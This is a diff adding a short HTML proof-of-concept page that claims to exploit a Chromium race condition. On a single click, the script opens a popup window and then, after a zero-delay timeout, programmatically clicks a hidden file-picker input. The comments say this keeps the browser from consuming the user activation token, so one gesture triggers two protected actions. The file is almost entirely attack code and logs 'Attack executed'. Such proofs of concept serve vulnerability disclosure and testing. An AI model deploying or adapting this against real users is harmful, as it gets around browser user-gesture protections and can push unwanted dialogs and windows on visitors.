@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Chromium Race Condition PoC</title>
+</head>
+<body style="height: 100vh; background: #eee;">
+    <h1>Click Once - Tested on Chrome Latest</h1>
+    <input type="file" id="sysDialog" style="display:none">
+    
+    <script>
+        const sysDialog = document.getElementById('sysDialog');
+        
+        document.body.onclick = () => {
+            // Step 1: Open Window
+            window.open('https://google.com', '_blank', 'width=200,height=200');
+
+            // Step 2: Race condition trigger with 0 delay
+            // This prevents the browser from consuming the user activation token correctly.
+            setTimeout(() => {
+                sysDialog.click();
+            }, 0);
+            
+            console.log("Attack executed");
+        };
+    </script>
+</body>
+</html>
